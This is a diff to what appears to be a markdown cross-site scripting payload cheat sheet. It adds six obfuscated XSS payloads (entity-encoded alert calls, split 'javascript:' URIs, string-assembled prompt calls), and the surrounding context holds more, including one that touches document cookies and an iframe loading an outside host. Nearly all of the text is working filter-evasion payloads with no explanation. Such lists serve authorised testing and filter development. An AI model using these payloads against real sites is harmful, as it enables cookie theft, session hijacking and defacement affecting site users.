@@ -80,7 +80,7 @@ asd"on+<>+onpointerenter%3d"x%3dconfirm,x(cookie)
 <script>eval(atob(decodeURIComponent("payload")))//
 <a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
 <svg onx=() onload=(confirm)(1)>
-<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
+<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>teste</a>
 <svg onload=prompt%26%230000000040document.domain)>
 <svg onload=prompt%26%23x000000028;document.domain)>
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
@@ -98,7 +98,12 @@ javascript:{alert`0`}
 0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
 <table background="javascript:alert(1)"></table>
 "/><marquee onfinish=confirm(123)>a</marquee>
-
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+<a69/onclick=write&lpar;&rpar;>hi
+<svg/onload=self[`aler`%2b`t`]`1`>
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
 
 ## XSS + SSRF <br>
